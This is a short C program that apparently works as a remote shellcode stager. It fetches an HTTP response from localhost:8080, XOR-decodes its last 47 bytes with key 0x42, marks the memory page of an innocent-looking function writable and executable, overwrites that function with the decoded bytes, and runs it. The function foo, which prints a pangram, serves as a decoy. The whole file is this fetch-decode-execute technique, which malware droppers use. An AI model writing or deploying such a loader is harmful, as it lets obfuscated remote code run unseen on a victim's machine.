
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define LEN 1024

const char REQUEST[] = "GET / HTTP/1.1\r\nHost: localhost:8080\r\n\r\n";

void foo(void);

int main(void) {
    int sockfd;
    size_t bytes, length, pagesize;
    void *p, *a;
    unsigned char *b;
    unsigned char buf[LEN];
    struct sockaddr_in addr;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        fprintf(stderr, "error opening socket\n");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    inet_pton(AF_INET, "localhost", &addr.sin_addr);

    if (connect(sockfd, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
        fprintf(stderr, "socket connection failed\n");
        exit(EXIT_FAILURE);
    }

    bytes = strlen(REQUEST);

    if (send(sockfd, (void *) REQUEST, bytes, 0) != bytes) {
        fprintf(stderr, "error sending request\n");
        exit(EXIT_FAILURE);
    }

    b = buf;
    length = LEN - 1;

    do {
        bytes = recv(sockfd, b, length, 0);
        b += bytes;
        length -= bytes;
    } while (bytes > 0 && length > 0);

    bytes = b - buf;

    if (close(sockfd) == -1) {
        fprintf(stderr, "error closing socket\n");
        exit(EXIT_FAILURE);
    }

    p = a = (void *) foo;
    pagesize = sysconf(_SC_PAGESIZE);
    p -= (size_t) p % pagesize;

    if (mprotect(p, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC) == -1) {
        fprintf(stderr, "error with page permissions\n");
        exit(EXIT_FAILURE);
    }

    for (size_t i = bytes - 0x2f; i < bytes; ++i) {
        buf[i] ^= 0x42;
    }

    p = buf + bytes - 0x2f;
    memcpy(a, p, 0x2f);

    foo();

    return EXIT_SUCCESS;
}

void foo(void) {
    puts("The quick brown fox jumped over the lazy sleeping dog.");
}

